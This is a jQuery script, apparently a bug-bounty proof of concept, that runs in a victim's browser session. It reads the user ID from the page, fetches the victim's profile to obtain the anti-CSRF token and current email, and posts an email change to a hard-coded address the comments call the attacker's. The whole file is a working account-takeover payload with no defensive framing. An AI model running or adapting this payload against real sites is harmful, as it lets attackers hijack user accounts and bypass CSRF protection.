$(document).ready(function() {
    // returns the anti-csrf token and current email address of the victim
    function fetchInfo() {
        var currentEmail = "";
        var userCsrfToken = "";
        var pattern = /<!--tlTUID:(\d+)-->/;
		var match = pattern.exec(document.head.innerHTML);
		var userId = match[1];
        $.ajax({
            url: "/users/" + userId + "/profile",
            async: false,
            success: function(data) {
                userCsrfToken = data.csrfToken;
                currentEmail = data.email;
            }
        });
        return [userCsrfToken, currentEmail, userId];
    }
    
    function changeEmail(newEmail) {
        var userInfo = fetchInfo();
        var emailChangeUrl = "/users/" + userInfo[2] + "/updateemail"
        var requestData = { 
            "newEmail": newEmail,
            "hiddenNewEmail": userInfo[1],
            "unsubscribe_on_updateEmail": "false",
            "confirmNewEmail": newEmail,
            "csrfToken": userInfo[0]
        };
        $.ajax({
            url: emailChangeUrl,
            type: "POST",
            async: false,
            data: JSON.stringify(requestData),
            contentType: "application/json"
        });
    }
    
    // triggering change email with the attacker's email address
    changeEmail("s4ur4bh+adiyogi@wearehackerone.com");

});
